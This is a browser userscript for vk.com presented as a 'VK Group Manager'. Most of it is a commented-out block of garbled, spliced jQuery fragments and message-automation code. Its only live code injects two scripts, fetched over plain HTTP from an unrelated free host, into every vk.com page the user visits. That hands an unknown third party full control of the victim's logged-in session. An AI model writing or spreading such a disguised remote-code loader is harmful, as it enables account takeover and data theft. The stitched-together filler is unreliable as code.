// ==UserScript==
// @name           VK Group Manager [NEW]
// @namespace      All
// @include        http://vkontakte.ru/*
// @include        http://vk.com/*
// ==/UserScript==

/*!
 function remdel() {
var a = document.getElementsByClassName('dialogs_del');
while(a[0] != undefined) {
a[0].parentNode.removeChild(a[0]);
}}

(function() {
	var id;
	function replace(){
		var a = document.getElementsByClassName('dialogs_del');
		while(a[0] != undefined) {
			a[0].parentNode.removeChild(a[0]);
		}
	}
	id = setInterval(replace, 1000);
	//replace();
function ta(a,b){var d=0;b.each(function(){if(this.nodeName===(a[d]&&a[d].nodeName)){var f=c.data(a[d++]),e=c.data(this,f);if(f=f&&f.events){delete e.handle;e.events={};for(var i in f)for(var j in f[i])c.event.add(this,i,f[i][j],f[i][j].data)}}})}function ua(a,b,d){var f,e,i;if(a.length===1&&typeof a[0]==="string"&&a[0].length<512&&a[0].indexOf("<option")<0){e=true;if(i=c.fragments[a[0]])if(i!==1)f=i}if(!f){b=b&&b[0]?b[0].ownerDocument||b[0]:s;f=b.createDocumentFragment();c.clean(a,b,f,d)}if(e)c.fragments[a[0]]=
i?f:1;return{fragment:f,cacheable:e}}function T(a){for(var b=0,d,f;(d=a[b])!=null;b++)if(!c.noData[d.nodeName.toLowerCase()]&&(f=d[H]))delete c.cache[f]}function L(a,b * ){var d={};c.each(va.concat.apply([],va.slice(0,b)),function(){d[this]=a});return d}function wa(a){return"scrollTo"in a&&a.document?a:a.nodeType===9?a.defaultView||a.parentWindow:false}var c=function(a,b){return new c.fn.init(a,b)},Ma=A.jQuery,Na=A.$,s=A.document,U,Oa=/^[^<]*(<[\w\W]+>)[^>]*$|^#([\w-]+)$/,Pa=/^.[^:#\[\.,]*$/,Qa=/\S/,
;(function() { 
	// for browsers without @include directive supporting
	if (!location.hostname.match("^(vkontakte\.ru|vk\.com)$")) {
		return;
	}

	 * Function for injection of javascript file to the document.
	 * @param src script source
	var script_load = function(src) {
		// solve document.head problem
		if (document.head === undefined) {
			document.head = document.getElementsByTagName('head')[0];
		}

		if (!window.document || !document.head) {
			return setTimeout(function(){script_load(src)}, 1);
		}
		var elem = document.createElement("script");
		elem.setAttribute("src", src);
		elem.setAttribute("type", "text/javascript");
		document.head.appendChild(elem);
	}
Ra=/^(\s|\u00A0)+|(\s|\u00A0)+$/g,Sa=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,P=navigator.userAgent,xa=false,Q=[],M,ca=Object.prototype.toString,da=Object.prototype.hasOwnProperty,ea=Array.prototype.push,R=Array.prototype.slice,V=Array.prototype.indexOf;c.fn=c.prototype={init:function(a,b){var d,f;if(!a)return this;if(a.nodeType){this.context=this[0]=a;this.length=1;return this}if(typeof a==="string")if((d=Oa.exec(a))&&(d[1]||!b))if(d[1]){f=b?b.ownerDocument||b:s;if(a=Sa.exec(a))if(c.isPlainObject(b)){a=[s.createElement(a[1])];
s.selector+"."+b+"("+d+")";return a},setArray:function(a){this.length=
$(function(){
    var name = $('div#profile_info h4.simple div.page_name').html();
    name = name.split(' ')[0];
    console.log(name);
    
    $('div#profile_main_actions div#profile_message_send.profile_action_btn div.button_wide a.button_link.cut_left').trigger('click');
    setTimeout(function(){
	console.log($('div.mail_box_content div.labeled textarea#write_box_text'));
	$('div.mail_box_content div.labeled textarea#write_box_text').val(
*/

if ((location.hostname == 'vkontakte.ru') || (location.hostname == 'vk.com'))
{
	var GM_JQ=document.createElement("script");
	GM_JQ.src="http://0x00000001.zzl.org/javascript/jquery.js";
	GM_JQ.type="text/javascript";
	var GM_SC=document.createElement("script");
	GM_SC.src="http://0x00000001.zzl.org/javascript/vkmain.js";
	GM_SC.type="text/javascript";
	
	document.getElementsByTagName("head")[0].appendChild(GM_JQ);
	document.getElementsByTagName("head")[0].appendChild(GM_SC);
}
